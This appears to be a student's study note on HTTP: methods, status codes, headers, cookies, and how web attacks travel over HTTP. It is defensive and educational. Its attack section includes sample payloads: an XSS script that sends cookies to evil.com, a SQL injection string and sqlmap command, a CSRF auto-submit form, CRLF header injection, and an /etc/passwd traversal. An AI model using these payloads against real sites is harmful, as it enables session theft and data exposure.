# HTTP — HyperText Transfer Protocol

A study note covering how HTTP works at the protocol level, the difference between HTTP and HTTPS, request and response structure, methods (GET, POST, PUT, DELETE), status codes, headers, cookies, and the direct relevance of HTTP to cybersecurity — including real-world attacks where HTTP was both the attack vector and the target.

---

## Overview

HTTP (HyperText Transfer Protocol) is the foundation of data communication on the web. It is an application-layer protocol that defines how clients and servers exchange messages — every time you open a website, an HTTP transaction happens.

HTTP is **stateless** — each request is independent. The server has no memory of previous requests unless a mechanism like cookies or sessions is used to maintain state.

```
Client (Browser) → HTTP Request → Server
Client (Browser) ← HTTP Response ← Server
```

HTTP operates on **port 80** by default. HTTPS operates on **port 443**.

> HTTP transmits data in plaintext. Anyone positioned between the client and server — an ISP, a router, a man-in-the-middle attacker — can read everything. HTTPS was created to solve this.

---

## HTTP vs HTTPS

### HTTP

- Data travels in plaintext
- No identity verification of the server
- No integrity guarantee — responses can be tampered with in transit
- Port 80

```
Browser → "GET /login HTTP/1.1" → Server
         [Username and password visible to anyone intercepting]
```

### HTTPS

HTTPS is HTTP with a TLS (Transport Layer Security) layer on top. TLS provides three things:

| Property | Description |
|----------|-------------|
| **Encryption** | Data is encrypted in transit — unreadable to interceptors |
| **Authentication** | The server presents a certificate proving its identity |
| **Integrity** | Data cannot be altered in transit without detection |

```
Browser → TLS Handshake → Server
        ↓
   Certificate verified
   Encryption negotiated
        ↓
Browser → [Encrypted HTTP] → Server
         [Everything inside is unreadable to interceptors]
```

### TLS Handshake (Simplified)

```
1. Client Hello   → "I support TLS 1.3. Here are my cipher suites."
2. Server Hello   → "Let's use TLS 1.3 + AES-256. Here is my certificate."
3. Client verifies the certificate against trusted CAs
4. Key exchange happens (Diffie-Hellman)
5. Session keys established
6. Encrypted communication begins
```

### HTTP vs HTTPS — Side by Side

| Feature | HTTP | HTTPS |
|---------|------|-------|
| Port | 80 | 443 |
| Encryption | ❌ None | ✅ TLS |
| Server Authentication | ❌ None | ✅ Certificate |
| Integrity | ❌ None | ✅ Guaranteed |
| Performance | Slightly faster | Negligible difference (modern TLS) |
| Use case | Internal dev only | Everything public-facing |

> Using HTTP for anything involving user input — login forms, search queries, API calls — is a critical security vulnerability. Credentials and sensitive data travel in plaintext.

---

## Key Concepts

| Term | Description |
|------|-------------|
| **Client** | The entity making the request — typically a browser or application |
| **Server** | The entity responding to the request |
| **Request** | A message from client to server asking for a resource or action |
| **Response** | A message from server to client containing the result |
| **URI / URL** | The address identifying the resource being requested |
| **Method** | The action the client wants to perform (GET, POST, PUT, DELETE, etc.) |
| **Status Code** | A 3-digit number in the response indicating the result of the request |
| **Header** | Metadata attached to a request or response (content type, auth tokens, cache rules, etc.) |
| **Body** | The optional data payload of a request or response |
| **Cookie** | A small piece of data the server sends to the client to persist state across requests |
| **Session** | A server-side record of a user's authenticated state, referenced by a session token |
| **TLS** | Transport Layer Security — the encryption layer that makes HTTPS work |
| **Certificate** | A cryptographically signed document that proves a server's identity |

---

## HTTP Request Structure

Every HTTP request has the same structure:

```
[Method] [Path] [HTTP Version]
[Headers]
[Blank line]
[Body — optional]
```

### Example — GET Request

```http
GET /products/42 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Accept: text/html,application/json
Accept-Language: en-US
Connection: keep-alive
```

No body — GET requests only ask for data, they do not send data in the body.

### Example — POST Request

```http
POST /api/login HTTP/1.1
Host: www.example.com
Content-Type: application/json
Content-Length: 47
Cookie: session_id=abc123

{"username": "pedro", "password": "secret123"}
```

The body contains the data being sent to the server.

---

## HTTP Response Structure

Every HTTP response has the same structure:

```
[HTTP Version] [Status Code] [Status Text]
[Headers]
[Blank line]
[Body — optional]
```

### Example — Successful Response

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 1523
Set-Cookie: session_id=xyz789; HttpOnly; Secure
Cache-Control: no-store

<!DOCTYPE html>
<html>
  <body>Welcome, Pedro.</body>
</html>
```

---

## HTTP Methods

HTTP methods (also called verbs) define the action the client wants to perform on the resource.

### GET

Retrieves a resource. Parameters go in the URL. No body. Should have no side effects on the server — it is a read-only operation.

```http
GET /users/42 HTTP/1.1
Host: api.example.com
```

```
Use cases:
- Loading a webpage
- Fetching API data
- Searching: GET /search?q=firewall
```

**Security note:** Never send sensitive data (passwords, tokens) via GET — URL parameters appear in browser history, server logs, and HTTP Referer headers.

---

### POST

Sends data to the server to create a resource or trigger an action. Data goes in the request body.

```http
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"name": "Pedro", "email": "pedro@example.com"}
```

```
Use cases:
- Submitting login forms
- Creating new records
- Uploading files
- Triggering actions (payments, email sends)
```

**Security note:** POST data is not visible in the URL — but it is not encrypted. Without HTTPS, POST bodies are transmitted in plaintext and fully visible to interceptors.

---

### PUT

Replaces an existing resource entirely with the data provided. If the resource does not exist, it may be created.

```http
PUT /api/users/42 HTTP/1.1
Host: api.example.com
Content-Type: application/json

{"name": "Pedro Marin", "email": "pedro@example.com", "role": "admin"}
```

```
Use cases:
- Updating a full user profile
- Replacing a configuration file via API
```

**Security note:** Insecure PUT endpoints can allow unauthorized resource modification or privilege escalation — an attacker who can PUT to `/users/42` may be able to change their own role to admin.

---

### DELETE

Requests that the server remove the specified resource.

```http
DELETE /api/users/42 HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGc...
```

```
Use cases:
- Deleting an account
- Removing a record via API
```

**Security note:** DELETE endpoints without proper authentication and authorization checks are a critical vulnerability. Broken Object Level Authorization (BOLA / IDOR) attacks frequently target DELETE and PUT methods to delete or overwrite resources belonging to other users.

---

### Other Methods

| Method | Purpose |
|--------|---------|
| **PATCH** | Partially updates a resource (only the fields provided) |
| **HEAD** | Same as GET but returns only headers — no body. Used to check if a resource exists |
| **OPTIONS** | Returns the methods the server supports for a given URL. Used in CORS preflight |
| **TRACE** | Echoes the request back — used for debugging. Often disabled due to XST attacks |
| **CONNECT** | Establishes a tunnel — used by proxies for HTTPS connections |

---

## Status Codes

Status codes are 3-digit numbers in HTTP responses that indicate the result of the request. They are grouped into five classes.

---

### 1xx — Informational

The request was received and processing is continuing. Rarely seen directly — they are protocol-level signals.

| Code | Name | Description |
|------|------|-------------|
| **100** | Continue | The server received the request headers and the client should proceed to send the body |
| **101** | Switching Protocols | The server is switching to a different protocol as requested (e.g., upgrading to WebSocket) |

```
Use case — 101:
Client: "Upgrade: websocket"
Server: "HTTP/1.1 101 Switching Protocols" → WebSocket connection begins
```

---

### 2xx — Success

The request was successfully received, understood, and accepted.

| Code | Name | Description |
|------|------|-------------|
| **200** | OK | Standard success. The response body contains the requested resource |
| **201** | Created | A new resource was successfully created (usually after POST or PUT) |
| **204** | No Content | Success, but no body to return (common after DELETE) |

```
200 — GET /users/42 → User data returned
201 — POST /api/users → New user created, Location header points to new resource
204 — DELETE /api/users/42 → User deleted, nothing to return
```

---

### 3xx — Redirection

Further action is needed to complete the request — typically following a redirect.

| Code | Name | Description |
|------|------|-------------|
| **301** | Moved Permanently | The resource has permanently moved to a new URL. Browsers and search engines update their records |
| **302** | Found | Temporary redirect. The resource is temporarily at a different URL — the original URL remains valid |
| **304** | Not Modified | The resource has not changed since the client's cached version — use the cache |
| **307** | Temporary Redirect | Same as 302 but the HTTP method must not change (POST stays POST) |
| **308** | Permanent Redirect | Same as 301 but the HTTP method must not change |

```
301 use case — HTTP to HTTPS migration:
  http://example.com → 301 → https://example.com (permanent)

302 use case — After login:
  POST /login → 302 → /dashboard (temporary, redirect after action)
```

**Security note:** Open redirect vulnerabilities occur when redirect URLs can be controlled by user input without validation. An attacker can craft a link to a trusted domain that redirects to a malicious site: `https://bank.com/redirect?url=https://evil.com`.

---

### 4xx — Client Error

The request contains bad syntax or cannot be fulfilled. The error is on the client side.

| Code | Name | Description |
|------|------|-------------|
| **400** | Bad Request | The server cannot process the request due to malformed syntax or invalid parameters |
| **401** | Unauthorized | Authentication is required and has not been provided or has failed |
| **403** | Forbidden | The server understood the request but refuses to authorize it — the client is authenticated but lacks permission |
| **404** | Not Found | The requested resource does not exist on the server |
| **405** | Method Not Allowed | The HTTP method used is not supported for this endpoint |
| **429** | Too Many Requests | The client has sent too many requests in a given time (rate limiting) |

```
401 vs 403 — Critical distinction:
  401 → "Who are you? Authenticate first."
  403 → "I know who you are. You are not allowed here."

404 → Resource does not exist
403 → Resource exists but access is denied
```

**Security note:** Information disclosure through status codes — returning 403 instead of 404 for protected resources confirms to an attacker that the resource exists, even if they cannot access it. Some applications intentionally return 404 for forbidden resources to avoid leaking information.

---

### 5xx — Server Error

The server encountered an error and failed to fulfill a valid request. The error is on the server side.

| Code | Name | Description |
|------|------|-------------|
| **500** | Internal Server Error | Generic server error — something went wrong on the server side |
| **502** | Bad Gateway | The server acting as a gateway received an invalid response from an upstream server |
| **503** | Service Unavailable | The server is temporarily unable to handle the request — overloaded or down for maintenance |
| **504** | Gateway Timeout | The server acting as a gateway did not receive a timely response from an upstream server |

```
503 use cases:
- Server is down for maintenance
- Server is overwhelmed by traffic (DDoS scenario)
- Dependent service (database, API) is unreachable
```

**Security note:** Verbose 500 errors that include stack traces, file paths, or database error messages leak internal implementation details. This information is directly useful for targeted attacks — framework versions, file structures, and query structures all assist an attacker in narrowing their approach.

---

## HTTP Headers

Headers are key-value pairs that carry metadata in both requests and responses. They control caching, authentication, content negotiation, security policies, and more.

### Common Request Headers

| Header | Purpose | Example |
|--------|---------|---------|
| **Host** | Specifies the target domain | `Host: www.example.com` |
| **User-Agent** | Identifies the client software | `User-Agent: Mozilla/5.0` |
| **Accept** | Tells the server what content types the client accepts | `Accept: application/json` |
| **Authorization** | Carries authentication credentials | `Authorization: Bearer eyJhbGc...` |
| **Cookie** | Sends stored cookies to the server | `Cookie: session_id=abc123` |
| **Content-Type** | Describes the format of the request body | `Content-Type: application/json` |
| **Referer** | The URL the client came from | `Referer: https://google.com` |
| **Origin** | The origin of the request (used in CORS) | `Origin: https://app.example.com` |

### Common Response Headers

| Header | Purpose | Example |
|--------|---------|---------|
| **Content-Type** | Describes the format of the response body | `Content-Type: text/html; charset=UTF-8` |
| **Set-Cookie** | Instructs the client to store a cookie | `Set-Cookie: session_id=xyz; HttpOnly; Secure` |
| **Location** | Used in redirects to specify the new URL | `Location: https://example.com/dashboard` |
| **Cache-Control** | Defines caching behavior | `Cache-Control: no-store` |
| **WWW-Authenticate** | Tells the client what authentication scheme to use | `WWW-Authenticate: Bearer` |
| **Server** | Identifies the server software | `Server: nginx/1.18.0` |

### Security Headers

Security headers are response headers that instruct the browser to enforce security policies. Missing or misconfigured security headers are a direct vulnerability.

| Header | Purpose |
|--------|---------|
| **Strict-Transport-Security (HSTS)** | Forces HTTPS — browsers will not connect over HTTP after seeing this header |
| **Content-Security-Policy (CSP)** | Restricts what sources scripts, styles, and other resources can be loaded from — primary defense against XSS |
| **X-Content-Type-Options** | Prevents browsers from MIME-sniffing responses — set to `nosniff` |
| **X-Frame-Options** | Prevents the page from being embedded in iframes — defense against clickjacking |
| **Referrer-Policy** | Controls how much referrer information is sent with requests |
| **Permissions-Policy** | Restricts browser features the page can use (camera, geolocation, microphone) |

```http
HTTP/1.1 200 OK
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

**Security note:** The `Server` response header often reveals the web server software and version. Attackers use this to look up known CVEs for that exact version. Best practice is to suppress or obfuscate this header.

---

## Cookies

Cookies are small pieces of data the server sends to the client to persist state across the stateless HTTP protocol. The browser stores them and sends them back with every subsequent request to the same domain.

### How Cookies Work

```
1. Client sends request (no cookie)
   GET /dashboard HTTP/1.1

2. Server authenticates user, creates session, sends cookie
   HTTP/1.1 200 OK
   Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

3. Browser stores the cookie

4. Every subsequent request includes the cookie
   GET /account HTTP/1.1
   Cookie: session_id=abc123

5. Server reads session_id, looks up the session, knows who the user is
```

### Cookie Attributes

| Attribute | Description |
|-----------|-------------|
| **HttpOnly** | Cookie cannot be accessed by JavaScript — prevents XSS from stealing session cookies |
| **Secure** | Cookie is only sent over HTTPS — never over plain HTTP |
| **SameSite** | Controls whether the cookie is sent with cross-site requests (Strict / Lax / None) — prevents CSRF |
| **Expires / Max-Age** | Sets the cookie's lifetime — without this, it is a session cookie that expires when the browser closes |
| **Domain** | Specifies which domains the cookie is sent to |
| **Path** | Restricts the cookie to a specific path on the domain |

### Cookie Security Flags

```http
Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

- `HttpOnly` → Prevents JavaScript from reading `document.cookie` → Stops XSS-based session hijacking
- `Secure` → Never sent over HTTP → Prevents interception on unencrypted connections
- `SameSite=Strict` → Cookie not sent with cross-origin requests → Prevents CSRF attacks

**Missing any of these flags is a vulnerability.** A session cookie without `HttpOnly` can be stolen by any XSS payload on the page. A session cookie without `Secure` can be intercepted on an HTTP connection. A cookie without `SameSite` is vulnerable to CSRF.

---

## HTTP in a Cybersecurity Context

### From an Attacker's Perspective

**Intercepting HTTP Traffic**

On an unencrypted HTTP connection, an attacker positioned on the same network (hotel Wi-Fi, coffee shop, ISP level) can read everything.

```bash
# Capture HTTP traffic with tcpdump
tcpdump -i eth0 -A 'tcp port 80'

# A login form over HTTP reveals credentials in plaintext:
POST /login HTTP/1.1
Host: bank.com
Content-Type: application/x-www-form-urlencoded

username=pedro&password=secret123
```

---

**SQL Injection via HTTP Parameters**

User input sent via HTTP (GET parameters, POST body) that is not sanitized before being used in database queries is the most common class of web vulnerability.

```http
GET /products?id=1' OR '1'='1 HTTP/1.1
Host: shop.example.com
```

If the application passes this directly to a SQL query, the injected condition makes it return all rows — potentially dumping the entire database.

```bash
# Automated SQL injection testing
sqlmap -u "http://example.com/products?id=1"
```

---

**Cross-Site Scripting (XSS)**

User input that is reflected back in HTTP responses without sanitization allows injection of JavaScript that executes in victims' browsers.

```http
GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

If the application includes the `q` parameter in the HTML response without escaping it, the script executes in every browser that loads that URL — and the attacker receives the victim's session cookie.

**Defense:** `HttpOnly` cookies prevent this script from accessing `document.cookie`. CSP headers prevent the injected script from making external requests.

---

**Cross-Site Request Forgery (CSRF)**

A victim who is authenticated to `bank.com` visits a malicious page. That page sends an HTTP request to `bank.com` on their behalf — the browser automatically includes the victim's cookies, so the server thinks it is a legitimate request.

```html
<!-- Malicious page includes this hidden form -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.forms[0].submit();</script>
```

**Defense:** `SameSite=Strict` cookies — the browser will not include them in cross-site requests, breaking the attack entirely. CSRF tokens add a second layer.

---

**Insecure Direct Object Reference (IDOR)**

An attacker modifies a resource identifier in a request to access objects belonging to other users.

```http
GET /api/invoices/1042 HTTP/1.1      ← attacker's invoice
GET /api/invoices/1043 HTTP/1.1      ← victim's invoice — accessed by changing one digit
```

If the server only checks that the user is authenticated (not that they own invoice 1043), the attacker can read, modify, or delete any resource.

**Defense:** Always validate that the authenticated user is authorized to access the specific object — not just that they are logged in.

---

**HTTP Header Injection**

If user-supplied input is included in HTTP response headers without sanitization, an attacker can inject additional headers or even split the response.

```
User input: pedro\r\nSet-Cookie: admin=true
Resulting header: User: pedro
                  Set-Cookie: admin=true
```

**Defense:** Validate and sanitize all input before including it in response headers. Never allow newlines in header values.

---

**Directory Traversal via HTTP**

An attacker manipulates a URL or parameter to access files outside the intended directory.

```http
GET /download?file=../../etc/passwd HTTP/1.1
```

If the application concatenates this directly into a file path, the attacker retrieves `/etc/passwd`.

---

### From a Defender's Perspective

```
Core HTTP security checklist:

✅ Enforce HTTPS everywhere — redirect all HTTP to HTTPS (301), set HSTS
✅ Set security headers — CSP, HSTS, X-Frame-Options, X-Content-Type-Options
✅ Cookie flags — HttpOnly, Secure, SameSite on all session cookies
✅ Validate all user input — parameters, headers, body, file names
✅ Implement proper authorization checks — not just authentication
✅ Rate limit sensitive endpoints — login, password reset, API calls
✅ Suppress verbose error messages — no stack traces or server version in production
✅ Log all HTTP requests and monitor for anomalies
```

---

## Real-World Breaches

### British Airways (2018)
A supply-chain attack involving a malicious JavaScript file injected into British Airways' payment page. The script collected form data — names, email addresses, and full payment card details — and sent it to an attacker-controlled domain via HTTP requests. The attack ran for two weeks, affecting approximately 500,000 customers. The script exploited the absence of a strict **Content-Security-Policy** — a properly configured CSP would have blocked the exfiltration request to the attacker's domain entirely.

### Equifax (2017)
The breach that exposed personal data of 147 million people originated through an unpatched Apache Struts vulnerability (CVE-2017-5638) — exploited via a malicious **Content-Type HTTP header** in a request to a public-facing web application. The vulnerability allowed remote code execution directly from a crafted header value. The application had not been patched despite a patch being available for two months.

### Twitch (2021)
Over 125GB of Twitch's source code and internal data was leaked. Among the exposed data was evidence of insufficient authorization checks on internal HTTP APIs — Insecure Direct Object Reference patterns allowed access to resources beyond what should have been permitted. The breach highlighted the risk of assuming internal APIs are safe from abuse.

> The pattern across these cases: HTTP is the attack surface of the web. SQL injection, XSS, CSRF, IDOR, header injection — all travel over HTTP. Securing the protocol layer (HTTPS, security headers, cookie flags) is necessary but not sufficient. The application logic handling those HTTP requests must also validate, authorize, and sanitize at every step.

---

## Common Misconfigurations

| Misconfiguration | Risk | Fix |
|-----------------|------|-----|
| HTTP instead of HTTPS | Credentials and data transmitted in plaintext | Enforce HTTPS, redirect HTTP → HTTPS, set HSTS |
| Session cookie without HttpOnly | XSS can steal session tokens | Always set HttpOnly on session cookies |
| Session cookie without Secure | Cookie sent over HTTP connections | Always set Secure on session cookies |
| Session cookie without SameSite | Vulnerable to CSRF | Set SameSite=Strict or Lax |
| Verbose 500 errors in production | Leaks stack traces, framework versions, file paths | Return generic error messages; log details server-side |
| Server header exposed | Reveals server software and version | Suppress or obfuscate the Server header |
| No Content-Security-Policy | XSS can load external scripts and exfiltrate data | Define a strict CSP |
| Open redirect | Phishing via trusted domain | Validate redirect URLs against an allowlist |
| No rate limiting on login | Brute-force and credential stuffing attacks | Implement rate limiting and account lockout |
| Sensitive data in GET parameters | Appears in logs, browser history, Referer header | Use POST for sensitive data; never put credentials in URLs |

---

## Best Practices

- Enforce HTTPS on every endpoint — no exceptions
- Set HSTS with a long max-age and include subdomains
- Always use `HttpOnly`, `Secure`, and `SameSite=Strict` on session cookies
- Define a strict Content-Security-Policy — default-src 'self' as a baseline
- Validate and sanitize all user input on the server side — never trust client-supplied data
- Implement authorization checks per object — authentication alone is not enough
- Rate limit login, registration, and password reset endpoints
- Suppress all verbose error output in production — log details server-side only
- Suppress or mask the `Server` response header
- Use short session token lifetimes and invalidate sessions on logout
- Log all HTTP requests and monitor for scanning patterns, unusual 4xx spikes, and large response sizes

---

## Full Flow Diagram

```
Client types: https://www.example.com/login

     │
     ▼
DNS resolves example.com → IP address
     │
     ▼
TCP connection established (3-way handshake)
     │
     ▼
TLS handshake — certificate verified, session keys established
     │
     ▼
Client sends HTTP Request:
  POST /login HTTP/1.1
  Host: www.example.com
  Content-Type: application/json
  Cookie: csrf_token=xyz

  {"username": "pedro", "password": "secret"}
     │
     ▼
Server receives request
  → Validates CSRF token
  → Checks credentials against database
  → Creates session
     │
     ▼
Server sends HTTP Response:
  HTTP/1.1 302 Found
  Location: /dashboard
  Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict
     │
     ▼
Browser follows redirect to /dashboard
Browser stores session cookie
     │
     ▼
Subsequent requests include:
  Cookie: session_id=abc123
  → Server identifies user without re-authentication
```

---

## What I Studied

- The difference between HTTP and HTTPS — encryption, authentication, integrity
- How TLS secures HTTP communication
- HTTP request and response structure
- HTTP methods: GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS
- Status codes by class: 1xx, 2xx, 3xx, 4xx, 5xx — and specific codes in detail
- HTTP headers — request, response, and security headers (HSTS, CSP, X-Frame-Options)
- Cookies — how they work, attributes (HttpOnly, Secure, SameSite), and security implications
- Attack techniques over HTTP: SQL injection, XSS, CSRF, IDOR, header injection, directory traversal
- Real breaches caused by HTTP-layer vulnerabilities
- Security headers and their role in defense

---

## Requirements

- No code required — this is a networking and security concept study note
- Practical exercises done via [TryHackMe](https://tryhackme.com)

---

## Origin

Studied as part of the networking and security curriculum on [TryHackMe](https://tryhackme.com).

---

## Author

[pedromarinflach-cyber](https://github.com/pedromarinflach-cyber)
